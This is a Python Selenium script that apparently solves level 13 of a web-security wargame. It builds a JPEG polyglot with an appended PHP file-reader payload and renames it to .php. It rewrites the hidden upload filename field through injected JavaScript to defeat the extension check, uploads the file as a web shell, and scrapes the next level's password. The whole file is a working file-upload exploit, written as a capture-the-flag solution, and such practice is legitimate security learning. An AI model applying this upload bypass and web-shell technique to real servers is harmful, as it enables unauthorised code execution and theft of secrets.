from common import *
import cv2
import numpy as np

def solve(driver, _ = None):
    driver.get(build_url(level=13))
    
    path = create_random_temp_file("jpg")
    cv2.imwrite(path, np.zeros((1, 1, 1), dtype=np.uint8))
    with open(path, "a") as f:
        f.write("\n"+build_php_file_reader(14))
    
    new_path = path[:-4] + ".php"
    os.rename(path, new_path)
    
    # change the file path on the server side
    driver.execute_script(f"""document.querySelector("#content > form > input[type=hidden]:nth-child(2)").setAttribute('value', '{new_path}')""")
    
    # upload the file
    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[3]').send_keys(new_path)
    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[4]').click()
    
    # get the password
    driver.find_element(By.XPATH, '/html/body/div[1]/a').click()
    WebDriverWait(driver, 10).until(lambda _: driver.find_element(By.XPATH, '/html/body'))
    text = driver.find_element(By.XPATH, '/html/body').text
    password = text[text.rfind(' ')+1:]
    
    # delete the file
    os.remove(new_path)
    
    driver.get(build_url(password = password, level=14))
    return password